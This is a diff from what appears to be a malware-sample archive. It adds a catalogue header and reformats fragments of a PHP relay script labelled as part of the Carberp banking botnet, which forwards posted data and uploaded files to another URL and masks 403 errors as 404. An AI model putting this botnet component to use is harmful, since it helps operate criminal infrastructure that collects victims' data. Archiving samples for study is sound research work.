@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 error_reporting(0);
@@ -10,14 +21,18 @@ $url = trim($url, "\r");
 $url = trim($url, "\n");
 
 $post = array();
-if(count($_POST) > 0){	foreach($_POST as $k => $p){		$post[$k] = $p;
+if(count($_POST) > 0){
+	foreach($_POST as $k => $p){
+		$post[$k] = $p;
 	}
 }
 
 $df = array();
-if(count($_FILES) > 0){	foreach($_FILES as $k => $p){
+if(count($_FILES) > 0){
+	foreach($_FILES as $k => $p){
 		$rf = $dir . 'cache/' .  $_FILES[$k]['name'];
-		if(move_uploaded_file($_FILES[$k]['tmp_name'], $rf)){			$post[$k] = '@' . $rf;
+		if(move_uploaded_file($_FILES[$k]['tmp_name'], $rf)){
+			$post[$k] = '@' . $rf;
 			$df[] = $rf;
 		}
 	}
@@ -49,8 +64,10 @@ if($code == '403'){
 	header("Status: 404 Not Found");
 }
 
-if(!empty($result)){	print($result);
-}else{	print($result);
+if(!empty($result)){
+	print($result);
+}else{
+	print($result);
 }
 
 foreach($df as $f){
